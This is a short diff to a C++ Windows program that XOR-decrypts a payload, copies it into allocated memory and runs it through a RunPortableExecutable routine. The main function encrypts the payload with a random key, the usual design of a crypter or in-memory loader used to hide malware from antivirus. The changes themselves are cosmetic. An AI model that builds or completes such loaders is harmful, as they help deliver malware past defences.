@@ -70,7 +70,6 @@ std::vector<unsigned char> xorDecrypt(const std::vector<unsigned char>& data, co
     return decryptedData;
 }
 
-
 int RunPortableExecutable(void* Image)
 {
     IMAGE_DOS_HEADER* DOSHeader;
@@ -198,9 +197,7 @@ void decryptAndExecute() {
     // Copy the decrypted payload to the allocated memory
     std::memcpy(exec, decryptedPayload.data(), decryptedPayload.size());
 
-
     RunPortableExecutable(exec);
-
 
     // Free the allocated memory
     VirtualFree(exec, 0, MEM_RELEASE);
@@ -228,8 +225,8 @@ int main() {
         std::random_device rd;
         std::mt19937 gen(rd());
         std::uniform_int_distribution<> dis(0, 255);
-        for (size_t i = 0; i < key.size(); ++i) {
-            key[i] = dis(gen);
+        for (auto& k : key) {
+            k = dis(gen);
         }
 
         // Encrypt the payload
